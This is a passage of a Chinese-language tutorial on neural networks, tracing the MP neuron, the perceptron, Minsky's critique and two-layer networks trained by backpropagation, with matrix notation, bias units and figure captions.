&lt;p&gt;图6 神经元模型&lt;/p&gt;
&lt;p&gt;连接是神经元中最重要的东西。每一个连接上都有一个权重。&lt;/p&gt;
&lt;p&gt;一个神经网络的训练算法就是让权重的值调整到最佳，以使得整个网络的预测效果最好。&lt;/p&gt;
&lt;p&gt;我们使用a来表示输入，用w来表示权值。一个表示连接的有向箭头可以这样理解：在初端，传递的信号大小仍然是a，端中间有加权参数w，经过这个加权后的信号会变成a*w，因此在连接的末端，信号的大小就变成了a*w。&lt;/p&gt;
&lt;p&gt;在其他绘图模型里，有向箭头可能表示的是值的不变传递。而在神经元模型里，每个有向箭头表示的是值的加权传递。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bd9b7b0534c0179f4e1187f44df85cda.jpg&quot; alt=&quot;&quot; width=&quot;445&quot; height=&quot;256&quot;&gt;&lt;/p&gt;
&lt;p&gt;图7 连接（connection）&lt;/p&gt;
&lt;p&gt;如果我们将神经元图中的所有变量用符号表示，并且写出输出的计算公式的话，就是下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/3140be3566c6bc116f08483c5f2e9989.jpg&quot; alt=&quot;&quot; width=&quot;625&quot; height=&quot;334&quot;&gt;&lt;/p&gt;
&lt;p&gt;图8 神经元计算&lt;/p&gt;
&lt;p&gt;可见z是在输入和权值的线性加权和叠加了一个&lt;strong&gt;函数g&lt;/strong&gt;的值。在MP模型里，函数g是sgn函数，也就是取符号函数。这个函数当输入大于0时，输出1，否则输出0。&lt;/p&gt;
&lt;p&gt;下面对神经元模型的图进行一些扩展。首先将sum函数与sgn函数合并到一个圆圈里，代表神经元的内部计算。其次，把输入a与输出z写到连接线的左上方，便于后面画复杂的网络。最后说明，一个神经元可以引出多个代表输出的有向箭头，但值都是一样的。&lt;/p&gt;
&lt;p&gt;神经元可以看作一个计算与存储单元。计算是神经元对其的输入进行计算功能。存储是神经元会暂存计算结果，并传递到下一层。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f109610076b4e37da0edf24138cbda02.jpg&quot; alt=&quot;&quot; width=&quot;828&quot; height=&quot;315&quot;&gt;&lt;/p&gt;
&lt;p&gt;图9 神经元扩展&lt;/p&gt;
&lt;p&gt;当我们用“神经元”组成网络以后，描述网络中的某个“神经元”时，我们更多地会用“&lt;strong&gt;单元&lt;/strong&gt;”（unit）来指代。同时由于神经网络的表现形式是一个有向图，有时也会用“&lt;strong&gt;节点&lt;/strong&gt;”（node）来表达同样的意思。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;神经元模型的使用可以这样理解：&lt;/p&gt;
&lt;p&gt;我们有一个数据，称之为样本。样本有四个属性，其中三个属性已知，一个属性未知。我们需要做的就是通过三个已知属性&lt;strong&gt;预测&lt;/strong&gt;未知属性。&lt;/p&gt;
&lt;p&gt;具体办法就是使用神经元的公式进行计算。三个已知属性的值是a&lt;sub&gt;1&lt;/sub&gt;，a&lt;sub&gt;2&lt;/sub&gt;，a&lt;sub&gt;3&lt;/sub&gt;，未知属性的值是z。z可以通过公式计算出来。&lt;/p&gt;
&lt;p&gt;这里，已知的属性称之为&lt;strong&gt;特征&lt;/strong&gt;，未知的属性称之为&lt;strong&gt;目标&lt;/strong&gt;。假设特征与目标之间确实是线性关系，并且我们已经得到表示这个关系的权值w&lt;sub&gt;1&lt;/sub&gt;，w&lt;sub&gt;2&lt;/sub&gt;，w&lt;sub&gt;3&lt;/sub&gt;。那么，我们就可以通过神经元模型预测新样本的目标。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1943年发布的MP模型，虽然简单，但已经建立了神经网络大厦的地基。但是，MP模型中，权重的值都是预先设置的，因此不能学习。&lt;/p&gt;
&lt;p&gt;1949年心理学家Hebb提出了Hebb学习率，认为人脑神经细胞的&lt;strong&gt;突触&lt;/strong&gt;（也就是连接）上的强度上可以变化的。于是计算科学家们开始考虑用调整权值的方法来让机器学习。这为后面的学习算法奠定了基础。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/5aa19ef3f2bc792bd4735ed21eb61533.jpg&quot; alt=&quot;&quot; width=&quot;179&quot; height=&quot;231&quot;&gt;&lt;/p&gt;
&lt;p&gt;图10 Donald Olding Hebb&lt;/p&gt;
&lt;p&gt;尽管神经元模型与Hebb学习律都已诞生，但限于当时的计算机能力，直到接近10年后，第一个真正意义的神经网络才诞生。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;third&quot;&gt;&lt;/a&gt;三. 单层神经网络（感知器）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.引子&lt;/strong&gt;&lt;strong&gt;　&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;1958年，计算科学家Rosenblatt提出了由两层神经元组成的神经网络。他给它起了一个名字–“感知器”（Perceptron）（有的文献翻译成“感知机”，下文统一用“感知器”来指代）。&lt;/p&gt;
&lt;p&gt;感知器是当时首个可以学习的人工神经网络。Rosenblatt现场演示了其学习识别简单图像的过程，在当时的社会引起了轰动。&lt;/p&gt;
&lt;p&gt;人们认为已经发现了智能的奥秘，许多学者和科研机构纷纷投入到神经网络的研究中。美国军方大力资助了神经网络的研究，并认为神经网络比“原子弹工程”更重要。这段时间直到1969年才结束，这个时期可以看作神经网络的第一次高潮。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/b8a11e04645b35052267675f52f4894e.jpg&quot; alt=&quot;&quot; width=&quot;520&quot; height=&quot;239&quot;&gt;&lt;/p&gt;
&lt;p&gt;图11 Rosenblat与感知器&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面来说明感知器模型。&lt;/p&gt;
&lt;p&gt;在原来MP模型的“输入”位置添加神经元节点，标志其为“输入单元”。其余不变，于是我们就有了下图：从本图开始，我们将权值w&lt;sub&gt;1&lt;/sub&gt;, w&lt;sub&gt;2&lt;/sub&gt;, w&lt;sub&gt;3&lt;/sub&gt;写到“连接线”的中间。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/8c02d03b107cc9b139277454f6667610.jpg&quot; alt=&quot;&quot; width=&quot;308&quot; height=&quot;339&quot;&gt;&lt;/p&gt;
&lt;p&gt;图12 单层神经网络&lt;/p&gt;
&lt;p&gt;在“感知器”中，有两个层次。分别是输入层和输出层。输入层里的“输入单元”只负责传输数据，不做计算。输出层里的“输出单元”则需要对前面一层的输入进行计算。&lt;/p&gt;
&lt;p&gt;我们把需要计算的层次称之为“计算层”，并把拥有一个计算层的网络称之为“单层神经网络”。有一些文献会按照网络拥有的层数来命名，例如把“感知器”称为两层神经网络。但在本文里，我们根据计算层的数量来命名。&lt;/p&gt;
&lt;p&gt;假如我们要预测的目标不再是一个值，而是一个向量，例如[2,3]。那么可以在输出层再增加一个“输出单元”。&lt;/p&gt;
&lt;p&gt;下图显示了带有两个输出单元的单层神经网络，其中输出单元z&lt;sub&gt;1&lt;/sub&gt;的计算公式如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bb7c6defe498b7f51a6b51eb09ad1e96.jpg&quot; alt=&quot;&quot; width=&quot;583&quot; height=&quot;365&quot;&gt;&lt;/p&gt;
&lt;p&gt;图13 单层神经网络(Z&lt;sub&gt;1&lt;/sub&gt;)&lt;/p&gt;
&lt;p&gt;可以看到，z&lt;sub&gt;1&lt;/sub&gt;的计算跟原先的z并没有区别。&lt;/p&gt;
&lt;p&gt;我们已知一个神经元的输出可以向多个神经元传递，因此z&lt;sub&gt;2&lt;/sub&gt;的计算公式如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/b5849bad20cbcd81adc7b1ff795f7105.jpg&quot; alt=&quot;&quot; width=&quot;591&quot; height=&quot;367&quot;&gt;&lt;/p&gt;
&lt;p&gt;图14 单层神经网络(Z&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;
&lt;p&gt;可以看到，z&lt;sub&gt;2&lt;/sub&gt;的计算中除了三个新的权值：w&lt;sub&gt;4&lt;/sub&gt;，w&lt;sub&gt;5&lt;/sub&gt;，w&lt;sub&gt;6&lt;/sub&gt;以外，其他与z&lt;sub&gt;1&lt;/sub&gt;是一样的。&lt;/p&gt;
&lt;p&gt;整个网络的输出如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/a009eff826ec574f9607061778a420a8.jpg&quot; alt=&quot;&quot; width=&quot;604&quot; height=&quot;414&quot;&gt;&lt;/p&gt;
&lt;p&gt;图15 单层神经网络(Z&lt;sub&gt;1&lt;/sub&gt;和Z&lt;sub&gt;2&lt;/sub&gt;)&lt;/p&gt;
&lt;p&gt;目前的表达公式有一点不让人满意的就是：w&lt;sub&gt;4&lt;/sub&gt;，w&lt;sub&gt;5&lt;/sub&gt;，w&lt;sub&gt;6&lt;/sub&gt;是后来加的，很难表现出跟原先的w&lt;sub&gt;1&lt;/sub&gt;，w&lt;sub&gt;2&lt;/sub&gt;，w&lt;sub&gt;3&lt;/sub&gt;的关系。&lt;/p&gt;
&lt;p&gt;因此我们改用二维的下标，用w&lt;sub&gt;x,y&lt;/sub&gt;来表达一个权值。下标中的x代表后一层神经元的序号，而y代表前一层神经元的序号（序号的顺序从上到下）。&lt;/p&gt;
&lt;p&gt;例如，w&lt;sub&gt;1,2&lt;/sub&gt;代表后一层的第1个神经元与前一层的第2个神经元的连接的权值（这种标记方式参照了Andrew Ng的课件）。根据以上方法标记，我们有了下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/09bf7cced16dd19f793695ac2d309ff2.jpg&quot; alt=&quot;&quot; width=&quot;630&quot; height=&quot;417&quot;&gt;&lt;/p&gt;
&lt;p&gt;图16 单层神经网络(扩展)&lt;/p&gt;
&lt;p&gt;如果我们仔细看输出的计算公式，会发现这两个公式就是线性代数方程组。因此可以用矩阵乘法来表达这两个公式。&lt;/p&gt;
&lt;p&gt;例如，输入的变量是[a&lt;sub&gt;1&lt;/sub&gt;，a&lt;sub&gt;2&lt;/sub&gt;，a&lt;sub&gt;3&lt;/sub&gt;]&lt;sup&gt;T&lt;/sup&gt;（代表由a&lt;sub&gt;1&lt;/sub&gt;，a&lt;sub&gt;2&lt;/sub&gt;，a&lt;sub&gt;3&lt;/sub&gt;组成的列向量），用向量&lt;strong&gt;a&lt;/strong&gt;来表示。方程的左边是[z&lt;sub&gt;1&lt;/sub&gt;，z&lt;sub&gt;2&lt;/sub&gt;]&lt;sup&gt;T&lt;/sup&gt;，用向量&lt;strong&gt;z&lt;/strong&gt;来表示。&lt;/p&gt;
&lt;p&gt;系数则是矩阵&lt;strong&gt;W&lt;/strong&gt;（2行3列的矩阵，排列形式与公式中的一样）。&lt;/p&gt;
&lt;p&gt;于是，输出公式可以改写成：&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt; * &lt;strong&gt;a&lt;/strong&gt;) = &lt;strong&gt;z&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;这个公式就是神经网络中从前一层计算后一层的&lt;strong&gt;矩阵运算。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;与神经元模型不同，感知器中的权值是通过训练得到的。因此，根据以前的知识我们知道，感知器类似一个&lt;strong&gt;逻辑回归&lt;/strong&gt;模型，可以做线性分类任务。&lt;/p&gt;
&lt;p&gt;我们可以用&lt;strong&gt;决策分界&lt;/strong&gt;来形象的表达分类的效果。决策分界就是在二维的数据平面中划出一条直线，当数据的维度是3维的时候，就是划出一个平面，当数据的维度是n维时，就是划出一个n-1维的超平面。&lt;/p&gt;
&lt;p&gt;下图显示了在二维平面中划出决策分界的效果，也就是感知器的分类效果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/611052d6c89760b7dce8b266410c8391.jpg&quot; alt=&quot;&quot; width=&quot;540&quot; height=&quot;447&quot;&gt;&lt;/p&gt;
&lt;p&gt;图17 单层神经网络（决策分界）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;感知器只能做简单的线性分类任务。但是当时的人们热情太过于高涨，并没有人清醒的认识到这点。于是，当人工智能领域的巨擘Minsky指出这点时，事态就发生了变化。&lt;/p&gt;
&lt;p&gt;Minsky在1969年出版了一本叫《Perceptron》的书，里面用详细的数学证明了感知器的弱点，尤其是感知器对XOR（异或）这样的简单分类任务都无法解决。&lt;/p&gt;
&lt;p&gt;Minsky认为，如果将计算层增加到两层，计算量则过大，而且没有有效的学习算法。所以，他认为研究更深层的网络是没有价值的。（本文成文后一个月，即2016年1月，&lt;a href=&quot;http://cacm.acm.org/news/197529-in-memoriam-marvin-minsky-1927-2016/fulltext&quot; target=&quot;_blank&quot;&gt;Minsky在美国去世&lt;/a&gt;。谨在本文中纪念这位著名的计算机研究专家与大拿。）&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/495bb97e2fec816df920f5521c6db4bb.jpg&quot; alt=&quot;&quot; width=&quot;198&quot; height=&quot;203&quot;&gt;&lt;/p&gt;
&lt;p&gt;图18 Marvin Minsky&lt;/p&gt;
&lt;p&gt;由于Minsky的巨大影响力以及书中呈现的悲观态度，让很多学者和实验室纷纷放弃了神经网络的研究。神经网络的研究陷入了冰河期。这个时期又被称为“AI winter”。&lt;/p&gt;
&lt;p&gt;接近10年以后，对于两层神经网络的研究才带来神经网络的复苏。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;a name=&quot;fourth&quot;&gt;&lt;/a&gt;四. 两层神经网络（多层感知器）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.引子&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;两层神经网络是本文的重点，因为正是在这时候，神经网络开始了大范围的推广与使用。&lt;/p&gt;
&lt;p&gt;Minsky说过单层神经网络无法解决异或问题。但是当增加一个计算层以后，两层神经网络不仅可以解决异或问题，而且具有非常好的非线性分类效果。不过两层神经网络的计算是一个问题，没有一个较好的解法。&lt;/p&gt;
&lt;p&gt;1986年，Rumelhar和Hinton等人提出了反向传播（Backpropagation，BP）算法，解决了两层神经网络所需要的复杂计算量问题，从而带动了业界使用两层神经网络研究的热潮。目前，大量的教授神经网络的教材，都是重点介绍两层（带一个隐藏层）神经网络的内容。&lt;/p&gt;
&lt;p&gt;这时候的Hinton还很年轻，30年以后，正是他重新定义了神经网络，带来了神经网络复苏的又一春。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/66c39213f60b8feb99cd84f19d035407.jpg&quot; alt=&quot;&quot; width=&quot;138&quot; height=&quot;208&quot;&gt;    &lt;img src=&quot;/images/jobbole.com/4213111eeae76fd70ae4f44ae3a2c68f.jpg&quot; alt=&quot;&quot; width=&quot;170&quot; height=&quot;209&quot;&gt;&lt;/p&gt;
&lt;p&gt;图19 David Rumelhart（左）以及 Geoffery Hinton（右）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.结构&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;两层神经网络除了包含一个输入层，一个输出层以外，还增加了一个中间层。此时，中间层和输出层都是计算层。我们扩展上节的单层神经网络，在右边新加一个层次（只含有一个节点）。&lt;/p&gt;
&lt;p&gt;现在，我们的权值矩阵增加到了两个，我们用上标来区分不同层次之间的变量。&lt;/p&gt;
&lt;p&gt;例如a&lt;sub&gt;x&lt;/sub&gt;&lt;sup&gt;(y)&lt;/sup&gt;代表第y层的第x个节点。z&lt;sub&gt;1&lt;/sub&gt;，z&lt;sub&gt;2&lt;/sub&gt;变成了a&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;，a&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;。下图给出了a&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;，a&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;的计算公式。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/cb16839ee1332740f2790bf1a6e268dd.jpg&quot; alt=&quot;&quot; width=&quot;568&quot; height=&quot;390&quot;&gt;&lt;/p&gt;
&lt;p&gt;图20 两层神经网络（中间层计算）&lt;/p&gt;
&lt;p&gt;计算最终输出z的方式是利用了中间层的a&lt;sub&gt;1&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;，a&lt;sub&gt;2&lt;/sub&gt;&lt;sup&gt;(2)&lt;/sup&gt;和第二个权值矩阵计算得到的，如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/a5eb055c9d17aed3d6438e2bd7c7ca08.jpg&quot; alt=&quot;&quot; width=&quot;577&quot; height=&quot;389&quot;&gt;&lt;/p&gt;
&lt;p&gt;图21 两层神经网络（输出层计算）&lt;/p&gt;
&lt;p&gt;假设我们的预测目标是一个向量，那么与前面类似，只需要在“输出层”再增加节点即可。&lt;/p&gt;
&lt;p&gt;我们使用向量和矩阵来表示层次中的变量。&lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;，&lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;，&lt;strong&gt;z&lt;/strong&gt;是网络中传输的向量数据。&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;和&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;是网络的矩阵参数。如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/3275f3339554620d190f37a69f627e8d.jpg&quot; alt=&quot;&quot; width=&quot;423&quot; height=&quot;389&quot;&gt;&lt;/p&gt;
&lt;p&gt;图22 两层神经网络（向量形式）&lt;/p&gt;
&lt;p&gt;使用矩阵运算来表达整个计算公式的话如下：&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;) = &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;;&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;) = &lt;strong&gt;z&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;由此可见，使用矩阵运算来表达是很简洁的，而且也不会受到节点数增多的影响（无论有多少节点参与运算，乘法两端都只有一个变量）。因此神经网络的教程中大量使用矩阵运算来描述。&lt;/p&gt;
&lt;p&gt;需要说明的是，至今为止，我们对神经网络的结构图的讨论中都没有提到偏置节点（bias unit）。事实上，这些节点是默认存在的。它本质上是一个只含有存储功能，且存储值永远为1的单元。在神经网络的每个层次中，除了输出层以外，都会含有这样一个偏置单元。正如线性回归模型与逻辑回归模型中的一样。&lt;/p&gt;
&lt;p&gt;偏置单元与后一层的所有节点都有连接，我们设这些参数值为向量&lt;strong&gt;b&lt;/strong&gt;，称之为偏置。如下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/7da39f5e2ec437a746b3733b48cdf2ab.jpg&quot; alt=&quot;&quot; width=&quot;431&quot; height=&quot;512&quot;&gt;&lt;/p&gt;
&lt;p&gt;图23 两层神经网络（考虑偏置节点）&lt;/p&gt;
&lt;p&gt;可以看出，偏置节点很好认，因为其没有输入（前一层中没有箭头指向它）。有些神经网络的结构图中会把偏置节点明显画出来，有些不会。一般情况下，我们都不会明确画出偏置节点。&lt;/p&gt;
&lt;p&gt;在考虑了偏置以后的一个神经网络的矩阵运算如下：&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(1) &lt;/sup&gt;+ &lt;strong&gt;b&lt;/strong&gt;&lt;sup&gt;(1)&lt;/sup&gt;) = &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;;&lt;/p&gt;
&lt;p&gt;g(&lt;strong&gt;W&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt; * &lt;strong&gt;a&lt;/strong&gt;&lt;sup&gt;(2) &lt;/sup&gt;+ &lt;strong&gt;b&lt;/strong&gt;&lt;sup&gt;(2)&lt;/sup&gt;) = &lt;strong&gt;z&lt;/strong&gt;;&lt;/p&gt;
&lt;p&gt;需要说明的是，在两层神经网络中，我们不再使用sgn函数作为函数g，而是使用平滑函数sigmoid作为函数g。我们把函数g也称作激活函数（active function）。&lt;/p&gt;
&lt;p&gt;事实上，神经网络的本质就是通过参数与激活函数来拟合特征与目标之间的真实函数关系。初学者可能认为画神经网络的结构图是为了在程序中实现这些圆圈与线，但在一个神经网络的程序中，既没有“线”这个对象，也没有“单元”这个对象。实现一个神经网络最需要的是线性代数库。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.效果&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;与单层神经网络不同。理论证明，两层神经网络可以无限逼近任意连续函数。&lt;/p&gt;
&lt;p&gt;这是什么意思呢？也就是说，面对复杂的非线性分类任务，两层（带一个隐藏层）神经网络可以分类的很好。&lt;/p&gt;
&lt;p&gt;下面就是一个例子（此两图来自colah的&lt;a href=&quot;http://colah.github.io/posts/2014-03-NN-Manifolds-Topology/&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;），红色的线与蓝色的线代表数据。而红色区域和蓝色区域代表由神经网络划开的区域，两者的分界线就是决策分界。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f98863274ed96be43e8f17f7c1a256ae.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;图24 两层神经网络（决策分界）&lt;/p&gt;
&lt;p&gt;可以看到，这个两层神经网络的决策分界是非常平滑的曲线，而且分类的很好。有趣的是，前面已经学到过，单层网络只能做线性分类任务。而两层神经网络中的后一层也是线性分类层，应该只能做线性分类任务。为什么两个线性分类任务结合就可以做非线性分类任务？&lt;/p&gt;
&lt;p&gt;我们可以把输出层的决策分界单独拿出来看一下。就是下图。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/bb2ed70d4be85f515d69022ec5322597.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;图25 两层神经网络（空间变换）&lt;/p&gt;
&lt;p&gt;可以看到，输出层的决策分界仍然是直线。关键就是，从输入层到隐藏层时，数据发生了空间变换。也就是说，两层神经网络中，隐藏层对原始的数据进行了一个空间变换，使其可以被线性分类，然后输出层的决策分界划出了一个线性分类分界线，对其进行分类。&lt;/p&gt;
&lt;p&gt;这样就导出了两层神经网络可以做非线性分类的关键–隐藏层。联想到我们一开始推导出的矩阵公式，我们知道，矩阵和向量相乘，本质上就是对向量的坐标空间进行一个变换。因此，隐藏层的参数矩阵的作用就是使得数据的原始坐标空间从线性不可分，转换成了线性可分。&lt;/p&gt;
&lt;p&gt;两层神经网络通过两层的线性模型模拟了数据内真实的非线性函数。因此，多层的神经网络的本质就是复杂函数拟合。&lt;/p&gt;
&lt;p&gt;下面来讨论一下隐藏层的节点数设计。在设计一个神经网络时，输入层的节点数需要与特征的维度匹配，输出层的节点数要与目标的维度匹配。而中间层的节点数，却是由设计者指定的。因此，“自由”把握在设计者的手中。但是，节点数设置的多少，却会影响到整个模型的效果。如何决定这个自由层的节点数呢？目前业界没有完善的理论来指导这个决策。一般是根据经验来设置。较好的方法就是预先设定几个可选值，通过切换这几个值来看整个模型的预测效果，选择效果最好的值作为最终选择。这种方法又叫做Grid Search（网格搜索）。&lt;/p&gt;
&lt;p&gt;了解了两层神经网络的结构以后，我们就可以看懂其它类似的结构图。例如EasyPR字符识别网络架构（下图）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/df6ce91a6e5595e7ae2cd2118e6c8642.jpg&quot; alt=&quot;&quot; width=&quot;550&quot; height=&quot;393&quot;&gt;&lt;/p&gt;
&lt;p&gt;图26 EasyPR字符识别网络&lt;/p&gt;
&lt;p&gt;EasyPR使用了字符的图像去进行字符文字的识别。输入是120维的向量。输出是要预测的文字类别，共有65类。根据实验，我们测试了一些隐藏层数目，发现当值为40时，整个网络在测试集上的效果较好，因此选择网络的最终结构就是120，40，65。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4.训练&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;下面简单介绍一下两层神经网络的训练。&lt;/p&gt;
&lt;p&gt;在Rosenblat提出的感知器模型中，模型中的参数可以被训练，但是使用的方法较为简单，并没有使用目前机器学习中通用的方法，这导致其扩展性与适用性非常有限。从两层神经网络开始，神经网络的研究人员开始使用机器学习相关的技术进行神经网络的训练。例如用大量的数据（1000-10000左右），使用算法进行优化等等，从而使得模型训练可以获得性能与数据利用上的双重优势。&lt;/p&gt;
&lt;p&gt;机器学习模型训练的目的，就是使得参数尽可能的与真实的模型逼近。具体做法是这样的。首先给所有参数赋上随机值。我们使用这些随机生成的参数值，来预测训练数据中的样本。样本的预测目标为y&lt;sub&gt;p&lt;/sub&gt;，真实目标为y。那么，定义一个值loss，计算公式如下。&lt;/p&gt;
&lt;p&gt;loss = (y&lt;sub&gt;p &lt;/sub&gt;– y)&lt;sup&gt;2&lt;/sup&gt;&lt;/p&gt;
&lt;p&gt;这个值称之为&lt;strong&gt;损失&lt;/strong&gt;（loss），我们的目标就是使对所有训练数据的损失和尽可能的小。&lt;/p&gt;
&lt;p&gt;如果将先前的神经网络预测的矩阵公式带入到y&lt;sub&gt;p&lt;/sub&gt;中（因为有z=y&lt;sub&gt;p&lt;/sub&gt;），那么我们可以把损失写为关于参数（parameter）的函数，这个函数称之为&lt;strong&gt;损失函数&lt;/strong&gt;（loss function）。下面的问题就是求：如何优化参数，能够让损失函数的值最小。&lt;/p&gt;
&lt;p&gt;此时这个问题就被转化为一个优化问题。一个常用方法就是高等数学中的求导，但是这里的问题由于参数不止一个，求导后计算导数等于0的运算量很大，所以一般来说解决这个优化问题使用的是&lt;strong&gt;梯度下降&lt;/strong&gt;算法。梯度下降算法每次计算参数在当前的梯度，然后让参数向着梯度的反方向前进一段距离，不断重复，直到梯度接近零时截止。一般这个时候，所有的参数恰好达到使损失函数达到一个最低值的状态。&lt;/p&gt;
&lt;p&gt;在神经网络模型中，由于结构复杂，每次计算梯度的代价很大。因此还需要使用&lt;strong&gt;反向传播&lt;/strong&gt;算法。反向传播算法是利用了神经网络的结构进行的计算。不一次计算所有参数的梯度，而是从后往前。首先计算输出层的梯度，然后是第二个参数矩阵的梯度，接着是中间层的梯度，再然后是第一个参数矩阵的梯度，最后是输入层的梯度。计算结束以后，所要的两个参数矩阵的梯度就都有了。&lt;/p&gt;
&lt;p&gt;反向传播算法可以直观的理解为下图。梯度的计算从后往前，一层层反向传播。前缀E代表着相对导数的意思。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/f60cd95d878143bf91287e80a4b961ff.jpg&quot; alt=&quot;&quot; width=&quot;403&quot; height=&quot;387&quot;&gt;&lt;/p&gt;
&lt;p&gt;图27 反向传播算法&lt;/p&gt;
&lt;p&gt;反向传播算法的启示是数学中的&lt;strong&gt;链式法则&lt;/strong&gt;。在此需要说明的是，尽管早期神经网络的研究人员努力从生物学中得到启发，但从BP算法开始，研究者们更多地从数学上寻求问题的最优解。不再盲目模拟人脑网络是神经网络研究走向成熟的标志。正如科学家们可以从鸟类的飞行中得到启发，但没有必要一定要完全模拟鸟类的飞行方式，也能制造可以飞天的飞机。&lt;/p&gt;
&lt;p&gt;优化问题只是训练中的一个部分。机器学习问题之所以称为学习问题，而不是优化问题，就是因为它不仅要求数据在训练集上求得一个较小的误差，在测试集上也要表现好。因为模型最终是要部署到没有见过训练数据的真实场景。提升模型在测试集上的预测效果的主题叫做&lt;strong&gt;泛化&lt;/strong&gt;（generalization），相关方法被称作正则化（regularization）。神经网络中常用的泛化技术有&lt;strong&gt;权重衰减&lt;/strong&gt;等。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;5.影响&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;两层神经网络在多个地方的应用说明了其效用与价值。10年前困扰神经网络界的异或问题被轻松解决。神经网络在这个时候，已经可以发力于语音识别，图像识别，自动驾驶等多个领域。&lt;/p&gt;
&lt;p&gt;历史总是惊人的相似，神经网络的学者们再次登上了《纽约时报》的专访。人们认为神经网络可以解决许多问题。就连娱乐界都开始受到了影响，当年的《终结者》电影中的阿诺都赶时髦地说一句：我的CPU是一个神经网络处理器，一个会学习的计算机。&lt;/p&gt;
&lt;p&gt;但是神经网络仍然存在若干的问题：尽管使用了BP算法，一次神经网络的训练仍然耗时太久，而且困扰训练优化的一个问题就是局部最优解问题，这使得神经网络的优化较为困难。同时，隐藏层的节点数需要调参，这使得使用不太方便，工程和研究人员对此多有抱怨。&lt;/p&gt;
